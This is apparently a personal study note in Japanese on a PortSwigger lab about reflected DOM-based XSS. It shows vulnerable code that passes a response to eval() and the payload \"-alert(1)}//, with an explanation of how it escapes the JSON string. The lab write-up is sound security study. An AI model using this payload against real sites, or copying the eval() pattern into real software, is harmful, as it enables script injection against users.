
Date: 2025-09-22
Tags: 
Links: [[XSS]], [[WSA]]

***

1. eval()脆弱
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		eval('var searchResultsObj = ' + this.responseText);
		displaySearchResults(searchResultsObj);
	}
};
xhr.open("GET", path + window.location.search);
xhr.send();
```

2. 適当に入力する
```
{
	"searchTerm":"aaaa",
	"results":[]
}
```

3. `\"-alert(1)}//`をフォームに入力して送信
```javascript
{
	"searchTerm":"\\"
	-alert(1)
}
//", "results":[]}
```
というふうに解釈される。
- **ダブルクオーテーションがバックスラッシュでエスケープされるから、さらにバックスラッシュを追加してそれをエスケープ**
- **マイナスはalert()を式として評価させるため。**
>;で一区切りするのも可。
- **//はjavascriptのコメントアウト**

***
# References

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected